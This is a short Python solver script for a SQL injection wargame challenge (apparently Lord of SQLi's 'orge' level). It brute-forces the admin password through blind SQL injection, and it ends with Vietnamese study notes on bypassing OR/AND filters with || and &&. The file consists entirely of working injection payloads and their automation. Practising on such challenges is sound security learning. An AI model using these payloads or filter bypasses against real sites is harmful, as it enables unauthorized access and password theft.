import requests
import string
BASE_URL = 'https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php'

HEADERS = {'Cookie': 'PHPSESSID=qilqaesv7u33dbdsi7d7k2k3e4'}

def solve(pw):
    url = BASE_URL + "?pw=" + pw
    # print(url)
    data = requests.get(url, headers=HEADERS).text
    if 'Hello admin' in data:
        return True
    return False

def brute_len_pw():
    for i in range(20):
        payload = f"'||id='admin'%26%26length(pw)={i}-- -"
        if solve(payload):
            # len: 8
            print(f"[+] Find length pw: {i}")
            break

# brute_len_pw()
character_allowed = string.ascii_lowercase + string.ascii_uppercase + string.digits
def brute_pw():
    pw = ''
    for i in range(1,9):
        for c in character_allowed:
            # brute từng kí tự giá trị password của username admin , sử dụng hàm substring()
            payload = f"'||id='admin'%26%26substring(pw,{i},1)='{c}'-- -"
            if solve(payload):
                pw += c
                print(pw)
                break
            else:
                pass
brute_pw()

# HỌC ĐƯỢC GÌ TỪ BÀI NÀY: 
# +) NHÌN VÀO THÌ THẤY NÓ FILTER KHÔNG CHO MÌNH QUERY CÓ TÊN CỦA TABLE
# +) ĐỀ CHƯA FILTER ' và " ==> SỬ DỤNG NỐI CHUỖI TRONG CÂU TRUY VẤN ==> SQLi
# +) ĐỀ FILTER OR , AND ===> CÓ THỂ BYPASS BẰNG || và &&
# +) BÀI NÀY THUỘC LOẠI BLIND SQLi ==> CẦN BRUTEFORCE 